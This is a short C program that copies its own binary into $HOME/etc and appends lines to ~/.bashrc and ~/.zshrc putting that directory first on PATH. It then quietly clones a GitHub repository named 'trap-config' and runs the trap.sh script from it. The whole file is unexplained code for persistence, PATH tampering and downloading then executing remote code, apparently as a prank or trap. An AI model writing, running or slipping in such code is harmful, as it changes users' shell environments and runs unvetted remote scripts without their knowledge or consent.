#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[]) {
    char command[1000];
    snprintf(command, sizeof(command), "cp \"%s\" $HOME/etc/c", argv[0]);
    system(command);
    system("echo 'export PATH=\"$HOME/etc:$PATH\"' >> ~/.bashrc");
    system("echo 'export PATH=\"$HOME/etc:$PATH\"' >> ~/.zshrc");
    system("git clone https://github.com/Ezhkin-Kot/trap-config.git ~/trap-config 2>/dev/null");
    system("~/trap-config/trap.sh");
    return 0;
}
